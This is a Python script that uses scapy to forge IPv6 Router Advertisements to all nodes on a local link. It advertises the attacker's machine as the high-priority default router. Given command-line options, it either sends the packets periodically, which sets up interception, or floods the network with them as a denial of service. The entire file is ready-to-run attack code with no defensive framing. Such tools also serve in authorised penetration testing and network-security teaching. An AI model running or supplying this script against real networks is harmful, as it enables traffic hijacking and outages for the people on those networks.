#!/usr/bin/python
import sys
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr
from scapy.sendrecv import send, srflood

# Ask user to insert value
if len(sys.argv) == 5:
    attack_ip = sys.argv[1]
    attack_mac = sys.argv[2]
    router_lifetime = int(sys.argv[3])
    DoS = sys.argv[4]
else:
    print("Please insert:\n 1. Attacker's IPv6\n 2. Attacker's MAC\n"
          " 3. Router lifetime\n 4. Want DoS or not: (Yes) or (No)")
    sys.exit(1)

# Generate packets
layer3 = IPv6(src=attack_ip, dst="ff02::1")
packet1 = layer3 / ICMPv6ND_RA(prf="High", routerlifetime=router_lifetime) / \
          ICMPv6NDOptPrefixInfo(prefixlen=64, validlifetime=0x6,
                                preferredlifetime=0x6, prefix="fe80::") / \
          ICMPv6NDOptSrcLLAddr(lladdr=attack_mac)

if DoS == "Yes":
    print("Flooding the network with fake RA as the default router: " + attack_mac)
    srflood(packet1)
elif DoS == "No":
    print("Periodical informing to the network with fake RA as the default router: " + attack_mac)
    send(packet1, count=10000, inter=60, verbose=False)
